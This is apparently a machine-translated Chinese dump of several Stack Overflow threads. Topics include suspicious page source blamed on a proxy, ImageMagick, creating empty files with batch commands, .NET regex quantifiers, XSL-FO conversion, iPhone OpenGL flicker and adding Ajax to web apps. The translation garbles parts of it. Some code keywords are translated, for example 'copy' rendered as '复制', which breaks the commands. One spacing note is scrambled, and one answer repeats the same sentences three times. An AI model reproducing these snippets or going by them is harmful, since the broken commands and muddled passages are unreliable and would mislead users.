    var _FORM_URL = '/threadexample/threadedcomments/comment/9/1/json/';
    var _REGISTER_URL = '/threadexample/register';
    var _CHECK_EXISTS_URL = '/threadexample/check_exists';
    var _LOGIN_URL = '/threadexample/login';
    var _IS_FOCUSED = null;
    var _ARROW_IMG_BASE = 'http://media.eflorenzano.com/img/arrow_';
    var _VOTE_BASE = '/threadexample/vote/';
</script>

<script type="text/javascript" src="http://media.eflorenzano.com/js/example2.js"></script>
</head> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T20:55:54.187

[DNS中毒？](http://dns.measurement-factory.com/cgi-bin/poison_browser.pl?qn=i.cssxx.com)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-12-26T01:00:35.450

我同意 Mediashakers

那是因为您使用的是 CoDeeN 项目代理服务器

尝试不使用代理，它会看到不同

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-16T20:40:32.143

很可能就是这种情况，因为这确实有点像一些阴暗的代码。如果您使用不同的计算机，源看起来是否相同？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T20:47:22.067

嗯...这里没有解决方案，但作为一个数据点：它对我来说一点也不像（Firefox 3.0.3，在 Gentoo Linux 中）。我在标题中得到以下有趣的元素：

```
<link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.4.1/build/reset/reset-min.css">
<link rel="stylesheet" type="text/css" href="http://media.eflorenzano.com/css/example2.css">
<script type="text/javascript" src="http://media.eflorenzano.com/js/jquery-1.2.2.min.js">
<script type="text/javascript" src="http://media.eflorenzano.com/js/jquery.form.js">
[...]
<script type="text/javascript" src="http://media.eflorenzano.com/js/example2.js">

```

这对我来说看起来很干净；四个对同一服务器上资源的引用，加上一个看起来像 Yahoo! 的 CSS。奇怪，我想知道为什么它对你来说看起来如此不同。希望一些真正的网络向导可以对此有所了解。

另外，我注意到所有看起来很奇怪的 URI:s 都有以句点结尾的域名，我认为这甚至是不合法的。我用谷歌搜索，找到了一些旧的 Digg 线程，但无法找到提到奇怪 URI:s 的确切评论。奇怪的。

# php - 使用 ImageMagick 查找图像文件的空白区域

> ID：210189
> 
> 赞同：0
> 
> 时间：2008-10-16T20:34:58.473
> 
> 标签：php, image, imagemagick

我需要能够确定图像的一部分（预定裁剪标记之外）是否包含任何图像内容。

ImageMagick（特别是php接口）有没有办法做到这一点？

场景：画布为 8.5x11，顶部、左侧和底部边缘的边距为 0.5 英寸，右侧边缘的边距为 1 英寸。图像需要适合打印的裁剪标记。

通常我使用 Photoshop 操作来执行此操作，但我正在尝试自动化该过程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T21:52:42.807

用黑色/白色矩形替换裁剪标记内的所有内容，对结果图像进行直方图并进行分析？

我可以用 ImageMagick 的命令行版本来做到这一点，但不知道如何用 PHP api 来表达它。

# firefox-addon - 谁能弄清楚如何更新到 flash_switcher.xpi 以包含 Flash Player 10

> ID：210191
> 
> 赞同：0
> 
> 时间：2008-10-16T20:35:05.227
> 
> 标签：firefox-addon, xpi, flashplayer-10

我对 XPI 一无所知，但我搜索了 install.rdf、*.js 和 *.xul 文件，没有发现对 Flash 版本数组的引用，所以我无法清楚地看到版本列表的来源.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-16T22:17:26.270

事实证明不需要更改代码；我刚刚将正确的文件添加到插件文件夹中。我还必须重命名其他插件文件夹名称以使其保持有序。

所以我已经将适用于 Windows 和 Linux 的 v10 Flash Player 添加到[flash switcher xpi](http://www.box.net/shared/fmghgzlaey)中，需要的人可以在那里下载。它采用 3 部分拉链。

# batch-file - 如何从批处理文件创建空文本文件？

> ID：210201
> 
> 赞同：267
> 
> 时间：2008-10-16T20:38:18.637
> 
> 标签：batch-file, cmd, dos

有人能记得使用 BAT 文件在 MSDOS 中创建空文件的命令是什么吗？

* * *

## 回答 #1

> 赞同：385
> 
> 时间：2008-10-17T04:07:34.580

```
复制 NUL EmptyFile.txt
```

DOS 在每个目录中都有一些特殊文件（实际上是设备），`NUL`相当于 UNIX 的`/dev/null`: 它是一个始终为空的神奇文件，并且会丢弃您写入的任何内容。这是其他一些[列表；](http://www.pcmag.com/encyclopedia_term/0,2542,t=DOS+device+names&i=41766,00.asp)`CON`偶尔也有用。

为了避免有任何输出，您可以使用

```
复制 /y NUL EmptyFile.txt >NUL
```

`/y`防止`copy`在输出到时提出您看不到的问题`NUL`。

* * *

## 回答 #2

> 赞同：246
> 
> 时间：2008-10-16T20:39:25.780

```
echo. 2>EmptyFile.txt 
```

* * *

## 回答 #3

> 赞同：196
> 
> 时间：2008-11-17T10:03:06.953

```
type NUL > EmptyFile.txt 
```

在阅读了前两篇文章后，我想到了这两者的融合。好像干净了一点。无需担心重定向“复制的 1 个文件”。message to `NUL`，就像上一篇文章一样，它旁边看起来不错`ECHO OutputLineFromLoop >> Emptyfile.txt`，通常会出现在批处理文件中。

* * *

## 回答 #4

> 赞同：73
> 
> 时间：2014-04-18T16:37:50.070

我从其他答案中收集的技术：

**使 0 字节文件**成为一种非常清晰、向后兼容的方式：

```
type nul >EmptyFile.txt 
```

想法来自：[匿名](https://stackoverflow.com/a/295214/611007)，[Danny Backett](https://stackoverflow.com/questions/210201/how-to-create-empty-text-file-from-a-batch-file#comment19853904_1330484)，可能还有其他人，我自己受到[JdeBP 工作的启发](https://superuser.com/users/38062/jdebp)

**另一种方式是 0 字节文件**，它是向后兼容的：

```
REM. >EmptyFile.txt 
```

想法来自：[约翰内斯](https://stackoverflow.com/a/2620900/611007)

**一个 0 字节文件**，也是向后兼容的第 3 路：

```
echo. 2>EmptyFile.txt 
```

想法来自：[TheSmurf](https://stackoverflow.com/a/210209/611007)

**自 Windows 2000 以来[可能可用](http://technet.microsoft.com/en-us/library/bb457122.aspx)**的系统方式为 0 字节文件：****

 **```
fsutil file createnew EmptyFile.txt 0 
```

想法来自：[Emm](https://stackoverflow.com/a/5507221/611007)

**一个 0 字节的文件覆盖只读文件**

```
ATTRIB -R filename.ext>NUL
(CD.>filename.ext)2>NUL 
```

想法来自：[版权](https://stackoverflow.com/a/9458324/611007)

**单个换行符**（2 个字节：`0x0D 0x0A`以[十六进制表示法](http://wiki.osdev.org/Hexadecimal_Notation)，或者写为`\r\n`）：

```
echo.>AlmostEmptyFile.txt 
```

注意：和之间*没有*空格。`echo``.``>`

想法来自：[如何在批处理文件中回显换行符？](https://stackoverflow.com/questions/132799/how-can-you-echo-a-newline-in-batch-files)

* * *

**编辑**似乎任何*重定向到文件的**无效*命令都会创建一个空文件。呵呵，特色！兼容性：未知

 *```
TheInvisibleFeature <nul >EmptyFile.txt 
```

**一个 0 字节的文件：无效的命令/具有随机名称**（兼容性：uknown）：

```
%RANDOM%-%TIME:~6,5% <nul >EmptyFile.txt 
```

来自：Hung Huynh 的随机[来源](http://unserializableone.blogspot.hu/2009/04/create-unique-temp-filename-with-batch.html)

**编辑 2** Andriy M[指出了](https://stackoverflow.com/questions/210201/how-to-create-empty-text-file-from-a-batch-file/23158286?noredirect=1#comment35653129_23158286)通过无效命令实现这一目标的可能最有趣/最发人深省的方法

**一个 0 字节的文件：无效的命令/时髦的方式**（兼容性：未知）

```
*>EmptyFile.txt 
```

想法来自：[Andriy M](https://stackoverflow.com/users/297408/andriy-m)

**一个 0 字节的文件 4th-coming 方式**：

```
break > file.txt 
```

想法来自：[foxidrive](https://stackoverflow.com/questions/210201/how-to-create-empty-text-file-from-a-batch-file/24822936#24822936)感谢[Double Gras](https://stackoverflow.com/users/289317/double-gras)的[评论](https://stackoverflow.com/questions/210201/how-to-create-empty-text-file-from-a-batch-file/23158286?noredirect=1#comment43905374_23158286)！

* * *

## 回答 #5

> 赞同：26
> 
> 时间：2010-04-12T09:13:41.903

快速移动。> 空文件

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2012-02-26T23:30:04.280

如果要写入的文件可能已经存在并且是只读的，请使用以下代码：

```
ATTRIB -R filename.ext
CD .>filename.ext 
```

如果不存在文件，只需执行以下操作：

```
CD .>filename.ext 
```

（根据 DodgyCodeException 的评论更新/更改代码）

为了抑制可能出现的任何错误：

```
ATTRIB -R filename.ext>NUL
(CD .>filename.ext)2>NUL 
```

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2011-03-31T22:38:20.097

```
fsutil file createnew file.cmd 0 
```

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2014-07-18T10:32:16.247

还有一个要添加到书中 - 简短而甜美的打字。

```
break>file.txt
break>"file with spaces in name.txt" 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-08-25T19:39:40.597

您可以使用`TYPE`命令而不是`COPY`. 试试这个：

```
TYPE File1.txt>File2.txt 
```

哪里`File1.txt`是空的。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2014-08-07T11:54:38.920

您也可以使用如下`SET`方式创建一个空文件`byte`

```
set x=x > EmptyFile.txt 
```

或者，如果您不想创建额外的变量，请重新分配现有变量，例如

```
set PROMPT=%PROMPT% > EmptyFile.txt 
```

或像这样：

```
set "PROMPT=%PROMPT%" > EmptyFile.txt 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-03-08T00:50:15.083

有无限的方法。

什么都不输出的命令：

```
break
cls
color
goto
pushd
popd
prompt
title 
```

奇怪的命令：

```
CD.
REM.
@echo off
cmd /c
START >FILE 
```

过时的`print`命令会生成一个空白文件：

```
print /d:EMPTY_TEXT_FILE nul 
```

* * *

## 回答 #12

> 赞同：-3
> 
> 时间：2014-03-10T22:16:13.143

最简单的方法是：

`echo. > Filename.txt`

* * *

## 回答 #13

> 赞同：-4
> 
> 时间：2020-01-25T06:27:27.737

**重要的：**

如果不设置编码，很多软件都会崩溃。git 是一个非常流行的例子。

`Set-Content "your_ignore_file.txt" .gitignore -Encoding utf8` **这是区分大小写的**并强制 utf8 编码！

# c# - 什么是“嵌套量词”，为什么它会导致我的正则表达式失败？

> ID：210206
> 
> 赞同：19
> 
> 时间：2008-10-16T20:39:14.517
> 
> 标签：c#, .net, regex

我有我在正则表达式伙伴中构建和测试的这个正则表达式。

```
"_ [ 0-9]{10}+ {1}+[ 0-9]{10}+ {2}+[ 0-9]{6}+ {2}[ 0-9]{2}" 
```

当我在 .Net C# 中使用它时

我收到异常

```
"parsing \"_ [ 0-9]{10}+ +[ 0-9]{10}+  +[ 0-9]{6}+  [ 0-9]{2}\" - Nested quantifier +." 
```

这个错误是什么意思？显然.net 不喜欢这种表达方式。

这是正则表达式伙伴，所以你可以理解我对正则表达式的意图......

```
_ [ 0-9]{10}+ {1}+[ 0-9]{10}+ {2}+[ 0-9]{6}+ {2}[ 0-9]{2}

Match the characters "_ " literally «_ »
Match a single character present in the list below «[ 0-9]{10}+»
   Exactly 10 times «{10}+»
   The character " " « »
   A character in the range between "0" and "9" «0-9»
Match the character " " literally « {1}+»
   Exactly 1 times «{1}+»
Match a single character present in the list below «[ 0-9]{10}+»
   Exactly 10 times «{10}+»
   The character " " « »
   A character in the range between "0" and "9" «0-9»
Match the character " " literally « {2}+»
   Exactly 2 times «{2}+»
Match a single character present in the list below «[ 0-9]{6}+»
   Exactly 6 times «{6}+»
   The character " " « »
   A character in the range between "0" and "9" «0-9»
Match the character " " literally « {2}»
   Exactly 2 times «{2}»
Match a single character present in the list below «[ 0-9]{2}»
   Exactly 2 times «{2}»
   The character " " « »
   A character in the range between "0" and "9" «0-9» 
```

简而言之...

什么是嵌套量词？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-16T20:48:19.460

.NET 抱怨样式量词`+`之后`{n}`没有任何意义。 `{n}`表示与给定组的 n 完全匹配。 `+`表示匹配给定组中的一个或多个。删除`+`'s，它会编译得很好。

```
"_ [ 0-9]{10} {1}[ 0-9]{10} {2}[ 0-9]{6} {2}[ 0-9]{2}" 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2008-10-16T20:56:34.233

.NET 不支持[所有格量​​词](http://www.regular-expressions.info/possessive.html)

```
{10}+ 
```

但是，{10} 应该具有完全相同的效果。如果最长的匹配失败，+ 会避免回溯并尝试更短的匹配，但由于 {10} 只能精确匹配 10 个字符以开始这并没有多大效果。

```
"_ [ 0-9]{10} [ 0-9]{10} {2}[ 0-9]{6} {2}[ 0-9]{2}" 
```

应该没事。我还删除了“{1}+”位。因为它只匹配一次，“A{1}+”相当于“A”。

**编辑** 正如 Porges 所说，如果您确实需要 .NET 中的所有格量词，那么原子组提供与 .NET`(?>[0-9]*)`等价的相同功能`[0-9]*+`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T20:53:16.970

他们是对的。此版本的正则表达式不会失败：

`(_ [ 0-9]{10})+(\s{1})+([ 0-9]{10})+(\s{2})+([ 0-9]{6})+\s{2}[ 0-9]{2}`

请注意使用括号来创建可以重复一次或多次的组。此外，您应该更具体并使用 \s 而不是空格，因为模式空格可能有意义，也可能没有意义。

顺便说一句，这个正则表达式看起来并不那么有用。您可能想问另一个问题，例如“如何使用正则表达式匹配此模式？”

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-11-09T15:06:29.050

如果您在 RegexBuddy 顶部的工具栏中选择 .NET 风格，RegexBuddy 将指示 .NET 不支持所有格量​​词，例如 {10}+。

由于 {10} 仅允许特定数量的重复，因此使其惰性或所有格毫无意义，即使它在支持惰性和/或所有格量词的正则表达式风格中在语法上是有效的。从您的正则表达式中删除 + 符号将使其在 .NET 中正常工作。

在其他情况下，在 RegexBuddy 的 Create 选项卡中双击所有格量词的错误。RegexBuddy 然后将所有格量词替换为功能等效的原子组。

如果您在 RegexBuddy 的“使用”选项卡上为 .NET 语言生成源代码片段，RegexBuddy 将自动替换源代码片段中正则表达式中的所有格量词。

# java - 如何在 Windows 中为 ESC/Java2 设置我的环境并使用 ESC/Java2 构建/运行？

> ID：210218
> 
> 赞同：0
> 
> 时间：2008-10-16T20:40:54.823
> 
> 标签：java, jml

如何在 WindowsXP 中为 ESC/Java2 设置我的执行环境？此外，如何在 WindowsXP 中使用 ESC/Java2 构建和运行项目。很难从他们的规范/自述文件和文档中分辨出来，特别是考虑到他们似乎更多地谈论基于 Unix 的操作系统这一事实。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-20T15:14:36.293

您可以使用[Eclipse Europa](http://archive.eclipse.org/eclipse/downloads/drops/R-3.3-200706251500/) (3.3) （或更高版本，风险自负......大多数插件都是向上兼容的）及其相关的[Eclipse Plugin](http://kind.ucd.ie/products/opensource/ESCJava2/escjava-eclipse/updates/)。

要安装插件，请转到帮助->软件更新->查找并安装，然后从插件的更新站点添加一个新的远程站点。然后您可以选择要安装的插件，然后单击“确定”提示。重新启动 Eclipse，然后应该安装它。

# c# - 在 C# 中的文档格式之间转换

> ID：210222
> 
> 赞同：0
> 
> 时间：2008-10-16T20:42:25.710
> 
> 标签：c#, html, xml, xsl-fo

在 C# 中转换 HTML、XML 和 XSL-FO 的最佳方法是什么？

我已经有了 HTML（从 FCKEditor 输入），我想打印一个 PDF（我有一个 XSL->PDF 转换器）。我只是似乎找不到一个可以从 HTML 转换为任何 XSL 友好的库。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-17T12:14:28.840

一两年前，我不得不从 C++/C# 程序生成 pdf。最后，我决定将 Apache 的 Java [FOP](http://xmlgraphics.apache.org/fop/)作为一个单独的进程来进行转换。使用 xsl-fo 的体验并不愉快。当时，似乎没有一个工具可以完全实现 xsl-fo。工具倾向于选择规范的一个子集并破解它。鉴于 xsl-fo 的庞大复杂性，我开始怀疑是否会有完整的实现。

FOP 往往是错误的，并且花费了大量时间来解决问题。XSLT 和 XPath 很难学习。花了几周的时间，我才看到了冗长的内容，并且可以迅速完成工作。不过，我认为我从来没有完全了解过 xsl-fo。它使 html 和 css 模型看起来像孩子的玩具。幸运的是，生成的 pdf 文件没有太多问题。:-)

无论如何，手头的任务：从 FCKEditor 的 xhtml 输出生成 pdf。

> 我只是似乎找不到一个可以从 HTML 转换为任何 XSL 友好的库。

呵呵。是的，那是因为没有一个，而且可能不会是一个很好的 html 到 xsl-fo 转换器。这样的转换器有一些缺点：浏览器的复杂性和 xsl-fo 的复杂性。对于这样一个转换器来处理一个普通的 html 文档，它需要一个 web 浏览器的胆量：布局、css 支持甚至可能是 JavaScript。然后它必须获取呈现的页面，并找出需要什么 xsl-fo 才能获得看起来相似的东西，并且适合 xsl-fo 的分页约束。

这就像制作一个单词查看器的问题：如果不重新实现很多单词，它大部分时间都很糟糕，因为它看起来不一样。

所以，你可以做什么？好吧，使用一小部分 html 是一个好的开始。希望 FCKEditor 的输出是 xhtml，因为将 html 转换为 xml 本身就是一个痛苦的世界（这对[tidy](http://tidy.sourceforge.net/)很有用）。接下来，除非某个可怜的灵魂已经为您的 xsl-fo 实现制作了 FCKEditor xhtml -> xsl-fo xslt，否则您必须制作一个。这包括学习 xsl-fo、xslt 和 xpath。根据我的经验，这将需要几周时间，并且将是一个拼凑的解决方案。

要开始使用 xsl-fo，我发现以下链接很有用：

*   [XSL-FO教程](http://www.ecrion.com/Support/Resources/XSL-FOTutorial/toc.xml.html)
*   [XSL 标准](http://www.w3.org/TR/xsl/)
*   [Apache FOP 合规性页面](http://xmlgraphics.apache.org/fop/compliance.html)
*   [XSL-FO：准备好迎接黄金时段了吗？](http://gilbane.com/gilbane_report.pl/94/XSLFO_Ready_for_Prime_Time.html)概述 xsl-fo 试图解决的问题
*   有关三个快速介绍，请参见[a](http://www.xml.com/pub/a/2001/01/17/xsl-fo/index.html)、[b](http://www.xml.com/pub/a/2001/01/24/xsl-fo/)和[c](http://www.xml.com/pub/a/2002/03/20/xsl-fo.html)

那么这些 xsl-fo、xslt 的东西和所有其他的东西是什么？[XSL-FO：准备好迎接黄金时段了吗](http://gilbane.com/gilbane_report.pl/94/XSLFO_Ready_for_Prime_Time.html)？将其布置为：

> 可扩展样式表语言系列 (XSL) XSL 是一系列用于定义 XML 文档转换和表示的建议。它由三部分组成：
> 
> *   XSL 转换 (XSLT)，一种用于转换 XML 的语言
> *   XML 路径语言 (XPath)，一种由 XSLT 用来访问或引用 XML 文档部分的表达式语言。（XPath 也被 XML Linking 规范使用）
> *   XSL 格式化对象 (XSL-FO)，一个用于指定格式化语义的 XML 词汇表

我的建议？跑。再找一个远方。寻找另一个解决方案。生成 LaTeX 文件，并将它们转换为 pdf。生成别的东西。[制作 word 文档并使用PDFCreator](http://sourceforge.net/projects/pdfcreator/)打印它们。生成图像。控制 Firefox 将页面打印为 pdf。远离以完全避免需要 pdf。任何东西，只要它不与 html、xsl-fo、FOP、xslt 和 xpath 作斗争。

PS：如果您需要任何帮助，请告诉我。:-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T20:45:21.617

我会先尝试[XSLT](http://www.w3schools.com/xsl/)。当您谈论格式化 XML 文档（这几乎就是您谈论的内容）时，这就是设计用来执行此操作的工具。

来自[维基](http://en.wikipedia.org/wiki/XSL_Formatting_Objects)：

> “使用 XSL-FO 背后的一般想法是，用户编写文档，而不是 FO，而是使用 XML 语言。XHTML、DocBook 和 TEI 都是可能的，但它可以是任何 XML 语言。然后，用户获得一个 XSLT 转换，要么自己编写一个，要么为相关文档类型找到一个。这个 XSLT 转换将 XML 转换为 XSL-FO。

您需要将 HTML 转换为 XSL-FO 的 XSLT。不知道在哪里可以买到，但显然这个概念并不陌生。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-06T18:41:58.610

非常丰富的交流在这里。我为我的 IT 合同业务创建了一个使用 ASP.NET 和 C#.NET 的 Web 应用程序。Web 应用程序的主要目标之一是生成各种格式的定制简历。我将我的简历内容存储在 SQL Server 数据库中，并以 C# 方法构建大部分原始 XML。我使用 XSLT 将其转换为 HTML，并且有一点点笨拙，我终于得到了一份基本的像样的简历。我的下一个目标是获得一份可打印的简历。我从图书馆得到了一本关于 XML 的书，并对 XSLT 进行了一些修改。然后我来到了 XSL-FO 章节。这时候冰山就来了。我想接受挑战，将 PDF 选项作为菜单选项，并将 XSLT 转换为 XSL-FO 到 PDF。事情是所有的书推荐都提到了商业产品。它只是不值钱，因为 PDF 不是必需的。我在 30 天的跟踪基础上查看了 Altova XMLSpy，但是当我尝试第一次转换 XSL-FO 示例文件时，我收到一条消息，指出我需要下载更多软件。那次下载永远从他们的网站上拿走，所以我放弃并删除了该软件。其他供应商提供的免费版商业软件没有转换选项。阅读此处的注释后，我决定自己避免使用 XSL-FO。我现在将尝试获取 MS Word 版本，如果我的客户想要将其转换为 PDF，他们可以从 Adob​​e 购买 PDF 创建版本。那次下载永远从他们的网站上拿走，所以我放弃并删除了该软件。其他供应商提供的免费版商业软件没有转换选项。阅读此处的注释后，我决定自己避免使用 XSL-FO。我现在将尝试获取 MS Word 版本，如果我的客户想要将其转换为 PDF，他们可以从 Adob​​e 购买 PDF 创建版本。那次下载永远从他们的网站上拿走，所以我放弃并删除了该软件。其他供应商提供的免费版商业软件没有转换选项。阅读此处的注释后，我决定自己避免使用 XSL-FO。我现在将尝试获取 MS Word 版本，如果我的客户想要将其转换为 PDF，他们可以从 Adob​​e 购买 PDF 创建版本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-22T14:23:43.477

这是一个死问题，但我想为未来的读者补充一点，FCKEditor 的当前化身（现在的 CKEditor）更擅长生成高质量的 XHTML（甚至用户可定义的一组标签也是可能的）。

我通过实际上不使用 XSL-FO 而是使用 (X)HTML 到 PDF 转换器来解决类似问题，该转换器在没有 XSL 转换的情况下从您的源呈现 PDF。我验证了生成的 XHTML 并使用 HtmlAgilityPack 修复了罕见的问题——这种方式将使您远离非语义 HTML 的复杂性。有很多转换器可供选择，我的选择是 wkhtmltopdf（如果钱不是问题，PrinceXML 是一个更好的选择——我很想使用它，但它太贵了）。

# iphone - 为什么我的 OpenGL ES iPhone 游戏在我第一次打开手机时会闪烁？

> ID：210225
> 
> 赞同：3
> 
> 时间：2008-10-16T20:42:42.903
> 
> 标签：iphone, opengl-es

我使用 OpenGL ES 为 iPhone 制作了一个简单的游戏。除此问题外，一切正常：

我完全关闭手机，然后重新打开，然后启动我的应用程序，我得到了这个奇怪的闪烁！每隔一帧都是正确的……不正确的帧只是一遍又一遍的同一帧。如果我退出应用程序，再次启动它一切都很好。如果我连续退出并重新启动 10 次，那么每次都很好。

但是，如果我关闭手机，然后重新打开，然后启动应用程序，我会在第一次启动应用程序时得到同样的闪烁。

为什么会这样？！

有没有其他人有这个问题？

干杯!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2010-06-12T07:25:02.087

Apple 发布了有关此问题的其他信息：

> 问：我的 OpenGL ES 应用程序闪烁。尤其是在 iPhone 3GS 上运行时，闪烁似乎每帧都会发生。我该如何解决这个问题？
> 
> 答：默认情况下，渲染缓冲区的内容在呈现到屏幕后会失效（通过调用 -EAGLContext/presentRenderbuffer:）。您的应用程序必须在每次绘制帧时完全重绘渲染缓冲区的内容，否则您可能会观察到闪烁或其他意外结果。
> 
> 您必须为屏幕上的每个像素提供一种颜色。在绘图代码的开头，最好使用 glClear() 来初始化颜色缓冲区。在帧开始时全屏清除每个颜色、深度和模板缓冲区（如果您正在使用它们）通常也可以提高应用程序的性能。
> 
> 如果您的应用程序需要在帧之间保留可绘制内容，您可以将选项 kEAGLDrawablePropertyRetainedBacking = YES 添加到 CAEAGLLayer 对象的 drawableProperties 属性中。使用此选项需要额外的内存，并且会降低应用程序的性能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T21:08:05.097

唔。我对 iPhone 上的 OpenGL 做的不多，但我不得不说我没有注意到其他应用程序的这种行为。我怀疑这与您切换活动帧缓冲区的方式有关。

也许看看一些示例代码，看看你在做什么不同？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-01-19T19:08:24.370

您是否有可能在没有进行任何 OpenGL 更新的情况下调用 glRenderBuffer() 并将 presentRenderBuffer 消息发送到您的 EAGLContext，即没有新的 glDrawElements 或 glDrawArrays。如果您在没有将 kEAGLDrawablePropertyRetainedBacking 设置为 YES 的情况下执行此操作，则可能会出现烦人的闪烁。

查看 CAEAGLLayer 的 drawableProperties 属性上的 kEAGLDrawablePropertyRetainedBacking。此属性确定可绘制表面在显示其内容后的行为。如果此属性设置为 NO，则不保留内容，因此不保证显示后保持不变。如果设置为YES，则内容保留，显示后保持不变。

我相信将 kEAGLDrawablePropertyRetainedBacking 设置为 YES 会掩盖问题，但不能解决问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-01-20T02:06:30.480

我相信这个问题与 iphone OS 控制应用程序（锁定和恢复，或警告弹出）时发生的顶点缓冲区损坏有关。我也有这个问题，但没有找到合适的解决方法，它似乎是场景中的一个或多个对象。我们使用纹理图集，共享纹理的其他对象似乎都没有受到影响。也许销毁和重新创建您的顶点缓冲区将解决这个问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2010-05-11T07:10:20.210

我在当前图像和固定图像之间交替闪烁/闪烁时遇到了同样的问题……它会发生在 3GS 上，但不会发生在 3G、第一代或模拟器上。

在我的情况下，问题是当我在 ESRenderer 中设置上下文时引起的，但实际上没有绘制任何东西，即在下面的代码中 [场景绘制] 在某些状态下没有绘制任何东西。在较旧的 iPhone 和 Sim 上，当您不绘制任何东西时，它似乎不会翻转 OpenGL 缓冲区……但在 3GS 上却可以。无论如何，我的解决方法是在我不绘制任何东西时停止那些状态下的动画（即停止调用绘制程序的计时器）。

```
- (void) draw
{
   [EAGLContext setCurrentContext:context]; 
   glBindFramebufferOES(GL_FRAMEBUFFER_OES, defaultFramebuffer);
   glViewport(0, 0, backingWidth, backingHeight);

   //Render the GLScene...
   [scene draw];

   glBindRenderbufferOES(GL_RENDERBUFFER_OES, colorRenderbuffer);
   [context presentRenderbuffer:GL_RENDERBUFFER_OES];   
} 
```

# html - 创建一个 Web 应用程序，然后向其中添加 Ajax？

> ID：210233
> 
> 赞同：1
> 
> 时间：2008-10-16T20:44:27.487
> 
> 标签：html, ajax, user-interface

我想你们当中有很多人已经开发了一个在线应用程序，它可以自动化许多流程并为您的公司节省时间和金钱。

问题是，您在开发该应用程序、将其全部设置到位、然后使用一些 Ajax 对其进行“调整”以提供更好的用户体验方面有何经验？

此外，在将 Ajax 添加到已开发的 Web 应用程序时，您建议使用哪些库？

最后，您在 Ajax 擅长的 Web 应用程序中看到了哪些常见流程？例如，在您键入时自动填充搜索框。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-16T20:51:51.730

我首选的构建支持 Ajax 的应用程序的方法是用老式的方式构建它，每个按钮、链接等都发布到服务器，然后劫持所有这些按钮、链接等点击到 Ajax 功能。

这确保了我的应用程序与浏览器兼容，这很好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T20:50:51.920

使用哪个并不重要，除非您尝试做一些非常专业的事情。

这是一个很好的列表：[http](http://code.google.com/apis/ajaxlibs/) ://code.google.com/apis/ajaxlibs/ 。

是的，自动完成器是 Ajax 的一个非常方便的实现。它对于数据密集型活动（例如填充向下钻取数据）也非常有用。

您可以使用这些库执行的很多操作都不是特定于 Ajax 的，还有很多 UI 交互也可以使用户受益。您可以使用其中许多库非常轻松地执行幻灯片和灯箱等操作。

选择一个你觉得舒服的。他们都使用的语法略有不同。试一试并尝试构建简单的示例。坚持你喜欢的那个。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T20:52:47.767

使用 ASP.NET Ajax 包装几块代码是一种简单的方法。但我个人更喜欢使用 jQuery。您可以使用它轻松添加一些简单的 Ajax 调用，以使 UI 响应更快，而无需 ASP.NET Ajax 开销。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-16T20:48:06.510

如果您正在使用 ASP.NET 编写应用程序，那么使用 ASP.NET AJAX 添加 AJAX 非常简单，并且在许多地方根本不需要您更改任何代码，除了向要修改的页面添加两个控件。

这适用于部分页面加载。您必须添加的控件（从我的头顶上）被称为类似

```
<asp:ScriptManager 
```

和

```
<asp:UpdatePanel 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-16T20:52:20.403

我用于 AJAX 的最重要的东西是列表和搜索表单。为什么？因为当您浏览一个包含 200 条记录的列表时加载整个页面的开销，所以用户浏览所有内容会令人沮丧。但是，如果您单击页面中的链接然后单击返回按钮或使用顶部的链接返回到您所在的同一页面，这一点很重要。

对于搜索表单，当您填写表单时，我使用 AJAX 查询返回前几个结果和一个表示返回多少记录的数字。

对于 AJAX 框架，我使用 mootools。[http://www.mootools.net](http://www.mootools.net)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-16T20:54:57.090

我会与第一张海报不同。添加 Ajax 并不总是像 1、2、3 那样容易。这真的取决于你所追求的。

添加诸如彩色动画之类的东西可以相当容易，但是如果您想要诸如自动填充文本框之类的东西，则需要额外的代码。这并不像在客户端添加一些东西那么容易。您还需要添加服务器端支持以获取部分查询结果。

除此之外，保持客户端脚本与服务器端支持同步会变得更加复杂。

但是考虑到简单的精神，您可以使用一些库来为网站“增添趣味”，其中包含已经提到的动画和其他可以相当容易实现的眼睛。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T21:01:40.087

如果不使用 ASP.NET，请忽略。您的问题并不清楚您的平台。

根据您创建 Web 应用程序的时间，您的 Web 配置文件可能需要一些调整才能使用 ASP.NET Ajax。最简单的查看方法是使用 ASP.NET Ajax 模板创建一个新网站并比较 Web 配置，根据需要复制配置项以使旧网站保持最新。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T21:11:44.373

如果“为它增添趣味”就是你所追求的，那么首先开发没有 AJAX 的功能齐全的应用程序。从这里您可以不显眼地添加 AJAX 功能，并确保应用程序在不支持 JavaScript 的浏览器中能够很好地降级。

